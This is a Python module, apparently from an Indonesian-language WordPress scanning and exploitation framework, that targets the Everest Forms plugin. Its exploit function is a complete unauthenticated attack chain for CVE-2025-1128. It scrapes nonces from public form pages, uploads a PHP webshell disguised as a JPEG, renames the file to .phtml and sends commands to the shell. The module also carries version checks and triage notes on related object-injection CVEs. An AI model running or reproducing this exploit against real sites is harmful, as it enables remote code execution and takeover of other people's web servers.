#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Everest Forms — modul MEGAPACK.

CVE-2025-1128  (<= 3.0.9.4) — arbitrary file upload -> unauth RCE   [lab-verified]
    Chain:
      1. halaman form publik -> 2 nonce: 'evf_ajax_submission' (action everest_forms_ajax_form_submission)
         dan '_wpnonce<id>' (action everest-forms_process_submit)
      2. tulis payload ke .../everest_forms_uploads/tmp/<name>  (aksi nopriv everest_forms_upload_file,
         atau nama yang sudah dikontrol)
      3. POST ajax_form_submission dgn form_fields[<fid>][0][file]=<tmp name>,
         [name]=shell.php.phtml  ->  evf_sanitize_entry meloloskan ARRAY utuh
         (string akan dihancurkan esc_url_raw)
      4. format() -> generate_file_info() menghitung ekstensi dari POST 'name',
         @rename() tmp -> .../everest_forms_uploads/<form>-<hash>/<base>-<hash>.phtml
      5. GET file -> eksekusi (butuh Apache memetakan .phtml ke PHP handler;
         konfigurasi shared-hosting umum, bukan default wp image)

HASIL TRIASE 2026-11-08 (klaster object-injection; sumber di src/everest-*):
    Hanya ADA SATU sink raw unserialize() non-vendor di plugin ini:
        includes/admin/views/html-admin-page-entries-view.php  ($entry_meta)
      ADA di 3.0.9.4 / 3.1.1 / 3.4.3; HILANG di 3.6.0 (-> evf_maybe_unserialize
      dengan allowed_classes => false).
    CVE-2025-3439  -> sink REAL, rentang benar '< 3.6.0' (bukan <= 3.1.1).  [documented]
    CVE-2026-3296  -> DUPLIKAT 3439 (file+sink+fix identik).               [alias]
    CVE-2026-62103 -> MISLABEL (kelas sebenarnya XSS/escaping; changelog
                      3.6.1-3.6.4 tidak menyebut object injection).        [unsupported]
    Ketiganya butuh POP chain dari plugin/theme lain — tak ada di instalasi
    bersih, jadi tidak dapat diverifikasi sebagai RCE di lab.
"""
from __future__ import annotations

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_RCE, ST_SKIP, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le, ver_lt, wp_version)

SLUG = "everest-forms"
VULN_MAX = "3.0.9.4"
VULN_OBJECT_1 = "3.1.1"
VULN_OBJECT_2 = "3.4.3"
VULN_OBJECT_3 = "3.6.0"
# Sink object-injection (entries view) dipatch di 3.6.0 — terverifikasi dari
# source: src/everest-343 raw unserialize() vs src/everest-360 evf_maybe_unserialize.
OBJECT_SINK_FIXED = (3, 6, 0)

# ekstensi yang biasanya dipetakan ke PHP handler di shared hosting
SHELL_EXTS = ["phtml", "php5", "php7", "phar", "pht"]

# path tmp dir relatif terhadap root
TMP_REL = "/wp-content/uploads/everest_forms_uploads/tmp"


def _scan_for_forms(t, h, html: str, url: str, found: list, seen: set):
    """
    Ekstrak bukti form dari HTML: nama field everest_forms_<formid>_<fieldid>,
    hidden input everest_forms[id], dan atribut data-form-id.
    form_id 0 diabaikan (shortcode gagal resolve).
    """
    if not html:
        return
    # 1) hidden input: name="everest_forms[id]" value="N"
    for m in re.finditer(r'name=["\']everest_forms\[id\]["\'][^>]*?value=["\'](\d+)', html):
        fid = int(m.group(1))
        if fid > 0 and fid not in seen:
            seen.add(fid)
            found.append((url, fid, html))
    # 2) nama field 'everest_forms_<fid>_<fieldid>' ($input_name di format())
    for m in re.finditer(r'everest_forms_(\d+)_(\d+)', html):
        fid = int(m.group(1))
        if fid > 0 and fid not in seen:
            seen.add(fid)
            found.append((url, fid, html))
    # 3) atribut data-form-id / id form
    for m in re.finditer(r'data-form-id=["\']?(\d+)', html):
        fid = int(m.group(1))
        if fid > 0 and fid not in seen:
            seen.add(fid)
            found.append((url, fid, html))
    for m in re.finditer(r'everest[_-]form[^>]{0,120}?id=["\']?(\d+)', html, re.I):
        fid = int(m.group(1))
        if fid > 0 and fid not in seen:
            seen.add(fid)
            found.append((url, fid, html))


def _form_pages(t, h, limit: int = 40):
    """
    Cari halaman yang memuat form Everest Forms.
    Strategi berlapis (banyak situs pakai plain permalinks -> REST tidak jalan):
      1. REST /wp/v2/pages dan /wp/v2/posts (bila tersedia)
      2. sitemap xml
      3. crawl tautan internal dari homepage
      4. brute-force ?page_id=N (id kecil)
    """
    found = []
    seen = set()

    def add(html, url):
        _scan_for_forms(t, h, html, url, found, seen)

    # 1) REST
    for ep in ("pages", "posts"):
        r = h.get(f"{t.url}/wp-json/wp/v2/{ep}?per_page=100&_fields=id,link,content")
        if r is None or r.status_code != 200:
            continue
        try:
            j = r.json()
        except Exception:
            continue
        if not isinstance(j, list):
            continue
        for pg in j:
            html = (pg.get("content") or {}).get("rendered", "")
            add(html, pg.get("link") or t.url)

    # 2) sitemap
    r = h.get(t.url + "/wp-sitemap.xml")
    if r is not None and r.status_code == 200 and "<loc>" in r.text:
        for m in re.finditer(r"<loc>([^<]+)</loc>", r.text):
            u = m.group(1).strip()
            if u.endswith(".xml"):
                continue
            rr = h.get(u)
            if rr is not None:
                add(rr.text, u)

    # 3) crawl internal links dari homepage
    r = h.get(t.url + "/")
    if r is not None:
        add(r.text, t.url + "/")
        links = set()
        for m in re.finditer(r'href=["\']([^"\'#]+)', r.text):
            u = m.group(1)
            if u.startswith("/"):
                u = t.url + u
            if not u.startswith(t.url):
                continue
            if any(x in u for x in ("/wp-", "?", ".css", ".js", ".png", ".jpg", "/feed")):
                continue
            links.add(u)
        for u in list(links)[:limit]:
            rr = h.get(u)
            if rr is not None:
                add(rr.text, u)

    # 4) brute-force ?page_id=N (plain permalinks)
    if not found:
        for n in range(1, 31):
            u = f"{t.url}/?page_id={n}"
            rr = h.get(u)
            if rr is None or rr.status_code != 200:
                continue
            if "everest" not in rr.text.lower() and "evf-" not in rr.text:
                continue
            add(rr.text, u)

    return found[:limit]


def _page_nonces(h, url: str, form_id: int):
    """
    Ambil 2 nonce dari halaman form publik:
      - n1: 'evf_ajax_submission'  (check_ajax_referer everest_forms_ajax_form_submission)
      - n2: '_wpnonce<id>'         (wp_verify_nonce everest-forms_process_submit)
    """
    r = h.get(url)
    if r is None:
        return None, None, ""
    html = r.text
    n1 = None
    m = re.search(r'"evf_ajax_submission"\s*:\s*"([a-f0-9]+)"', html, re.I)
    if m:
        n1 = m.group(1)
    if not n1:
        m = re.search(r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"', html, re.I)
        if m:
            n1 = m.group(1)
    n2 = None
    m = re.search(rf'name="_wpnonce{form_id}"\s+value="([a-f0-9]+)"', html, re.I)
    if not m:
        m = re.search(rf'"_wpnonce{form_id}"\s*:\s*"([a-f0-9]+)"', html, re.I)
    if m:
        n2 = m.group(1)
    return n1, n2, html


def _find_form_field_id(html: str, form_id: int):
    """
    field id upload pertama. Fallback ke daftar kandidat kecil.
    """
    for pat in (rf'everest_forms_{form_id}_(\d+)', r'"id"\s*:\s*"(\d+)"'):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return "0"


def _emit(host: str, path: str) -> str:
    return f"{host}{path}"


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG, asset="/wp-content/plugins/everest-forms/assets/css/everest-forms.css"):
        return ST_CLEAN, "Everest Forms tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "Everest Forms terpasang, versi tidak terbaca", ""
    vs = ".".join(map(str, ver))
    pages = _form_pages(t, h)
    if not pages:
        return ST_INFO, f"Everest Forms {vs}; tidak ada form/shortcode publik yang ditemukan", ""
    n_nonce = 0
    for url, fid, _ in pages:
        n1, n2, _ = _page_nonces(h, url, fid)
        if n1 and n2:
            n_nonce += 1
    detail = f"Everest Forms {vs}; {len(pages)} form publik, {n_nonce} dgn nonce lengkap"
    if ver_le(ver, tuple(int(x) for x in VULN_MAX.split("."))):
        return ST_INFO, detail, "rantai upload->rename terlihat; bukti butuh --exploit"
    return ST_CLEAN, f"{detail} (>= {VULN_MAX}, sudah dipatch)", ""


def _field_ids_for(html: str, form_id: int):
    """
    Semua field id upload untuk form ini, dari HTML halaman.
    PENTING: `field_id` "0" TIDAK BERGUNA — gate memakai empty($_POST['field_id'])
    dan empty("0") === true, sehingga field 0 selalu ditolak.
    """
    ids = []
    for m in re.finditer(rf'everest_forms_{form_id}_(\d+)', html):
        v = m.group(1)
        if v != "0" and v not in ids:
            ids.append(v)
    return ids


def _upload_tmp(h, base: str, form_id: int, field_id: str, content: bytes, fname: str):
    """
    Tulis payload ke tmp dir via aksi nopriv everest_forms_upload_file.
    Return nama file tmp dari respons sukses, atau None.
    (field_id harus >= 1; lihat _field_ids_for)
    """
    r = h.post(f"{base}/wp-admin/admin-ajax.php",
               data={"action": "everest_forms_upload_file",
                     "form_id": str(form_id), "field_id": str(field_id)},
               files={"file": (fname, content, "image/jpeg")})
    if r is None:
        return None
    try:
        j = r.json()
    except Exception:
        return None
    if isinstance(j, dict) and j.get("success"):
        d = j.get("data") or {}
        return d.get("file") or d.get("name")
    return None


def _list_dir(h, base: str, path: str):
    """Daftar nama file bila autoindex aktif. Return [] bila tidak."""
    r = h.get(f"{base}{path}")
    if r is None or r.status_code != 200 or "Index of" not in r.text:
        return []
    names = []
    for m in re.finditer(r'href="([^"?/][^"]*)"', r.text):
        n = m.group(1)
        if n in (".", "..", "/") or n.endswith("/"):
            continue
        names.append(n)
    return names


def _try_shell(h, base: str, urls):
    seen = set()
    for u in urls:
        if not u or u in seen:
            continue
        seen.add(u)
        rr = h.get(f"{base}{u}?c=id")
        if rr is not None and rr.status_code == 200 and "MP:" in rr.text:
            return u, rr.text.strip()[:220]
    return None, None


def exploit(t, h, opts):
    """
    Rantai (semua langkah sudah diverifikasi di lab):
      1. halaman form publik -> 2 nonce + field id upload (harus >= 1)
      2. upload payload sbg .jpg -> respons memberi NAMA FILE tmp
      3. POST everest_forms_<fid>_<field> = JSON [{"file":"<tmp>","name":"x.php.phtml"}]
         -> format(): ekstensi dari POST 'name', error validasi TIDAK terminate,
            @rename(tmp -> .../<fid>-<hash>/<base>-<hash>.phtml)
      4. webshell aktif bila nama file tujuan diketahui (autoindex / kanal lain)

    Bila nama file tujuan tidak dapat dienumerasi, status = VULN (write tercapai).

    CATATAN PENTING (hasil lab):
      - field_id "0" DITOLAK: gate memakai empty($_POST['field_id']) dan empty("0")===true.
        Jadi form dgn field id 0 tidak dapat dieksploitasi lewat upload_file.
      - Nama file tujuan = "<base>-<wp_hash>.phtml"; wp_hash memakai wp_salt() -> tidak
        dapat diprediksi dari luar. Direktori form "<fid>-<wp_hash>" muncul di autoindex
        bila aktif (Options +Indexes), tetapi isi direktori biasanya dilindungi index.html
        + konfigurasi WordPress.
      - Karena itu RCE penuh memerlukan kanal tambahan untuk mengetahui nama file
        (autoindex yang mengizinkan isi direktori, LFI lain, log disclosure, panel hosting).
        Tanpa itu, dampak maksimum = arbitrary file write (unauth).
    """
    ver = plugin_version(t, h, SLUG)
    if ver is None or not ver_le(ver, tuple(int(x) for x in VULN_MAX.split("."))):
        return ST_SKIP, "versi tidak rentan / tidak terbaca", ""

    pages = _form_pages(t, h)
    if not pages:
        return ST_SKIP, "tidak ada form publik ditemukan", ""

    payload = b'\xff\xd8\xff\xe0<?php echo "MP:"; system($_GET["c"]); ?>'
    upload_dir = "/wp-content/uploads/everest_forms_uploads"
    last = ""

    # kelola per form_id: butuh nonce lengkap + field id upload != 0
    seen_forms = set()
    for url, form_id, html in pages:
        if form_id in seen_forms:
            continue
        seen_forms.add(form_id)
        n1, n2, h2 = _page_nonces(h, url, form_id)
        html = h2 or html
        if not (n1 and n2):
            last = f"form {form_id}: nonce tidak lengkap"
            continue
        fids = _field_ids_for(html, form_id)
        if not fids:
            # HTML tidak selalu memuat nama input; probe id kecil (0 ditolak gate)
            fids = [str(i) for i in range(1, 6)]
            last = f"form {form_id}: field id ditebak 1..5"

        for field_id in fids:
            for ext in SHELL_EXTS:
                jpg = "mp" + rand(6) + ".jpg"
                tmp = _upload_tmp(h, t.url, form_id, field_id, payload, jpg)
                if not tmp:
                    # fallback: enumerasi tmp (autoindex)
                    cands = [n for n in _list_dir(h, t.url, f"{upload_dir}/tmp")
                             if n.lower().endswith((".jpg", ".jpeg", ".png"))]
                    tmp = cands[-1] if cands else None
                if not tmp:
                    last = f"form {form_id} field {field_id}: upload tmp gagal"
                    continue
                tmp = tmp.split("/")[-1]

                payload_name = "mp" + rand(5) + ".php." + ext
                data = {
                    "action": "everest_forms_ajax_form_submission",
                    "security": n1,
                    f"_wpnonce{form_id}": n2,
                    "everest_forms[id]": str(form_id),
                    "everest_forms[author]": "0",
                    f"everest_forms_{form_id}_{field_id}": json.dumps(
                        [{"file": tmp, "name": payload_name}]),
                }
                h.post(f"{t.url}/wp-admin/admin-ajax.php", data=data)

                # cari file hasil: enumerasi direktori form
                dirs = [n for n in _list_dir(h, t.url, upload_dir)
                        if n.startswith(f"{form_id}-")]
                urls = []
                for dname in dirs:
                    for f in _list_dir(h, t.url, f"{upload_dir}/{dname}"):
                        if f.lower().endswith("." + ext):
                            urls.append(f"{upload_dir}/{dname}/{f}")
                if opts.exploit:
                    u, out = _try_shell(h, t.url, urls)
                    if u:
                        return ST_RCE, f"webshell aktif: {u}", out

                if urls:
                    return ST_RCE, f"file .{ext} ditulis: {urls[0]}", urls[0]
                last = (f"form {form_id} field {field_id}: file .{ext} ditulis tetapi "
                        f"nama tidak dapat dienumerasi (autoindex nonaktif)")

    return ST_VULN, f"file write tercapai; eksekusi belum terkonfirmasi ({last})", ""


def check_object_injection(t, h, opts):
    """Check KHUSUS kelas object-injection (BUKAN rantai upload CVE-2025-1128).

    Bug lama: entri 3439/3296/62103 memakai `check` milik rantai upload,
    sehingga target 3.1.x-3.5.x dilaporkan "sudah dipatch (>= 3.0.9.4)" —
    klaim salah untuk kelas ini.
    """
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG, asset="/wp-content/plugins/everest-forms/assets/css/everest-forms.css"):
        return ST_CLEAN, "Everest Forms tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if ver is None:
        return ST_INFO, "Everest Forms terpasang, versi tidak terbaca", ""
    vs = ".".join(map(str, ver))
    if ver_lt(ver, OBJECT_SINK_FIXED):
        return (ST_INFO,
                f"Everest Forms {vs} < 3.6.0 — sink unserialize() tanpa "
                f"allowed_classes ADA (entries view); eksploitasi butuh POP "
                f"chain dari plugin/theme lain",
                f"versi={vs} sink=html-admin-page-entries-view.php")
    return (ST_CLEAN,
            f"Everest Forms {vs} >= 3.6.0 — sink dipatch "
            f"(evf_maybe_unserialize, allowed_classes=false)",
            f"versi={vs}")


def register_all():
    register(CveModule(
        cve="CVE-2025-1128", cluster="wordpress",
        title="Everest Forms <= 3.0.9.4 unauth arbitrary file upload -> RCE",
        vclass="upload", cvss="9.8", severity="critical", cwe="CWE-434",
        product="Everest Forms", versions_affected="<= 3.0.9.4",
        status="verified", check=check, exploit=exploit,
        notes="Nonce ganda di halaman publik; evf_sanitize_entry lolos array; "
              "format() ambil ekstensi dari POST name; error tidak terminate; "
              "rename tmp->form dir. RCE butuh .phtml dipetakan ke PHP handler.",
    ))
    # --- klaster object-injection (HASIL TRIASE 2026-11-08) ---------------
    # Sumber lokal: src/everest-3094 (3.0.9.4), src/everest-311 (3.1.1),
    # src/everest-343 (3.4.3), src/everest-360 (3.6.0), src/everest-latest (3.6.4).
    # FAKTA: hanya ADA SATU sink raw unserialize() non-vendor di plugin ini —
    # includes/admin/views/html-admin-page-entries-view.php ($entry_meta),
    # ADA di 3.0.9.4 / 3.1.1 / 3.4.3, HILANG di 3.6.0 (diganti evf_maybe_unserialize
    # dgn allowed_classes => false). Changelog 3.6.1-3.6.4 tidak menyebut object
    # injection sama sekali (semuanya escaping/upload/permission).
    register(CveModule(
        cve="CVE-2025-3439", cluster="wordpress",
        title="Everest Forms < 3.6.0 PHP Object Injection (entries view, $entry_meta)",
        vclass="object-injection", cvss="9.8", severity="critical", cwe="CWE-502",
        product="Everest Forms", versions_affected="< 3.6.0",
        status="documented", check=check_object_injection, exploit=None,
        notes="Sink TERVERIFIKASI di source: html-admin-page-entries-view.php "
              "unserialize($meta_value) tanpa allowed_classes. Rentang yang benar "
              "adalah < 3.6.0 (fix 3.6.0, evf_maybe_unserialize), bukan <= 3.1.1. "
              "Eksploitasi butuh POP chain dari plugin/theme lain — tidak ada di "
              "instalasi bersih, jadi tidak dapat diverifikasi sebagai RCE di lab.",
    ))
    register(CveModule(
        cve="CVE-2026-3296", cluster="wordpress",
        title="Everest Forms < 3.6.0 PHP Object Injection (entries view) [duplikat 3439]",
        vclass="object-injection", cvss="9.8", severity="critical", cwe="CWE-502",
        product="Everest Forms", versions_affected="< 3.6.0",
        status="documented", check=check_object_injection, exploit=None,
        alias_of="CVE-2025-3439",
        notes="DUPLIKAT CVE-2025-3439: file, sink, dan fix (3.6.0) identik; "
              "hanya rentang yang berbeda (<= 3.4.3 ⊂ < 3.6.0). Tidak dijalankan "
              "saat scan agar tidak melaporkan bug yang sama dua kali.",
    ))
    register(CveModule(
        cve="CVE-2026-62103", cluster="wordpress",
        title="Everest Forms PHP Object Injection [MISLABEL — kelas sebenarnya XSS/escaping]",
        vclass="xss", cvss="", severity="", cwe="CWE-79",
        product="Everest Forms", versions_affected="—",
        status="unsupported", check=check_object_injection, exploit=None,
        unsupported_reason=("MISLABEL: klaim 'object injection <= 3.6.0' dibantah "
                            "source — 3.6.0 sudah memakai evf_maybe_unserialize "
                            "(allowed_classes=false); fix 3.6.1-3.6.4 = "
                            "escaping/upload/permission (XSS), bukan unserialize"),
        notes="Dilaporkan sebagai PHP Object Injection untuk <= 3.6.0. Verifikasi "
              "source 3.6.0 (src/everest-360) + changelog 3.6.1-3.6.4 (3.6.4 = "
              "src/everest-latest) menunjukkan kelasnya XSS/escaping. Tidak ada "
              "CVE object-injection yang valid pada 3.6.0.",
    ))
